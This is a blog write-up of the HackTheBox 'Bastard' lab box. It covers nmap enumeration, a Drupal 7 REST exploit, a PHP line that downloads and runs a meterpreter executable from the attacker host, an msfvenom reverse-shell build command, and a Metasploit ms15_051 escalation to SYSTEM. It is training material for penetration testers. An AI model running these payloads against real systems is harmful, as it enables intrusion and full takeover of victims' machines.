---
layout: post
title:  "HackTheBox - Bastard"
date:   2017-12-25 21:50:00 +0100
categories: hackthebox
image:
  feature: bastard.jpg
  credit:
  creditlink:
---
This post describes multiple attacks upon the Bastard box on [hackthebox.eu](http://hackthebox.eu).  I've found myself updating and transferring my old blog in some of the dead hours of today and Piers Morgan somehow made it on the Netflix special I was watching with the family.  Couldn't resist a dig!

Introduction
==========
Bastard is very much a box about understanding your environment much in the same vein as Optimum.  In fact I would say this box is a good follow up to Optimum as it takes a lot of the lessons from that box but makes it a little bit harder.

Enumeration
==========

Nmap
--------

```bash
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
```

Instantly we know two things about this box.  It's running Drupal and the host is windows.  This does affect getting a shell slightly, as I'd been so used to returning a shell on Linux LAMP stack boxes that I was sending incorrect shells most of the time.  Despite the name however, this isn't as bad as it sounds.  You'll take a lot of lessons from this device that will go into exploiting harder boxes.

So, looking around we quickly realise that this version of Drupal is 7.54.  This is fairly recent but not ridiculously so.  Checking exploit-db also only yields one applicable exploit.  [https://www.exploit-db.com/exploits/41564/](https://www.exploit-db.com/exploits/41564/)

I won't go in depth on how this exploit works, but the cliff-notes are that it attacks a REST endpoint created by the services extension.  To exploit we just need to find out the name of the REST endpoint (security through obscurity).  Honestly, exploiting this is simply a case of reading the exploit and the attached write-up. 

So to find the rest-endpoint just fire up your favourite web directory scanner and let 'er rip.  This one took a while, but in the end we found it, it's just `/rest`.  So change the endpoint to /rest and then the payload is uploaded to the server.  You can either replace it with your own in the exploit file, giving you an instant shell, or you can use the default one to get a shell.

Exploitation
-------------

So now we have the rest endpoint location, we just need to run it on the directory we found.  This uploads a php backdoor which will execute any php we send in a post request.  Adjusting the payload is quite finnicky considering what we're working with is a windows server, so in cases like that I use the below:
```php
file_put_contents("meta.exe", fopen("http://10.10.13.182/metasploit_https.exe", 'r'));
shell_exec('meta.exe');
```
This will download an executable shell from a http web server and then execute it.  To generate a shell msfvenom is as always our go to:
```bash
msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=10.10.13.182 LPORT=4443 > metasploit_https.exe
```
Set up a listener and we're returned a shell.


Privilege Escalation
===============

For this, we run the metasploit exploit suggester and come across a number of candidate metasploit exploits.  The below will show exploiting ms15_051_client_copy_image:
```bash
msf exploit(ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  8                yes       The session to run this module on.


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.117.134  yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows x64


msf exploit(ms15_051_client_copy_image) > set SESSION 9
SESSION => 9
msf exploit(ms15_051_client_copy_image) > set lhost 10.10.13.182
lhost => 10.10.13.182
msf exploit(ms15_051_client_copy_image) > exploit

[*] Started reverse TCP handler on 10.10.13.182:4444 
[*] Launching notepad to host the exploit...
[+] Process 1956 launched.
[*] Reflectively injecting the exploit DLL into 1956...
[*] Injecting exploit into 1956...
[*] Exploit injected. Injecting payload into 1956...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Command shell session 10 opened (10.10.13.182:4444 -> 10.10.10.9:50058) at 2017-06-20 09:03:20 +0100

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system
```
We have System!
